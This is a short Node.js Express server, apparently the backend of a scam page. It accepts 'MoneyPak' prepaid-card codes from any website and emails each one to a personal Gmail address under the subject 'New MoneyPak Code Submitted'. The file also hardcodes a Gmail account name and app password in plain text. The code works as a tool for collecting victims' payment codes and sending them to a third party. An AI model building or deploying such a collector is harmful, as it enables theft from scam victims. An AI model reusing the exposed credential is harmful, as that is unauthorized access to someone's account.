const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();

app.use(cors({ origin: "*" }));
app.use(express.json());

const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "survivalmanagementc@gmail.com",
        pass: "syhp nqlk lsvh oasp"
    }
});

app.post("/send-code", async (req, res) => {
    const { code } = req.body;

    if (!code) {
        return res.status(400).json({ message: "No code provided" });
    }

    try {
        await transporter.sendMail({
            from: "survivalmanagementc@gmail.com",
            to: "victoriawallings21@gmail.com",
            subject: "New MoneyPak Code Submitted",
            text: `Code entered: ${code}`
        });

        res.json({ message: "Code sent successfully!" });

    } catch (err) {
        console.log(err);
        res.status(500).json({ message: "Email failed" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running"));